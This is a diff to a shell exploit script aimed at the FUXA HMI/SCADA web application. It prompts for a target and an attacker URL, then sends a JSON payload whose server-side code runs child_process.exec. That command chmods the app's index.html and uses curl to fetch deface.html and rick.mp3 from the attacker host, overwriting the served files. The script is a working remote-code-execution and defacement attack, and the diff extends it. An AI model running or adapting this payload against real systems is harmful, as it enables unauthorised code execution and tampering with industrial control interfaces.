@@ -13,7 +13,7 @@ echo "                                                                          
 
 
 read -p "Enter target URL (e.g. http://192.18.48.50:1881): " TARGET_URL
-read -p "Enter attacker URL (e.g. http://192.168.10.10:8000/deface.html: " ATTKR_URL
+read -p "Enter attacker URL (e.g. http://192.168.10.10:8000): " ATTKR_URL
 
 
 data="$(cat <<EOF
@@ -25,7 +25,7 @@ data="$(cat <<EOF
     "sync": false,
     "parameters": [],
     "mode": "SERVER",
-    "code": "require('child_process').exec('chmod +w /usr/src/app/FUXA/client/dist/index.html; curl $ATTKR_URL > /usr/src/app/FUXA/client/dist/index.html')",
+    "code": "require('child_process').exec('chmod +w /usr/src/app/FUXA/client/dist/index.html; curl $ATTKR_URL/deface.html > /usr/src/app/FUXA/client/dist/index.html; curl $ATTKR_URL/rick.mp3 > /usr/src/app/FUXA/client/dist/rick.mp3')",
     "scheduling": {
       "mode": "interval",
       "interval": 86000,
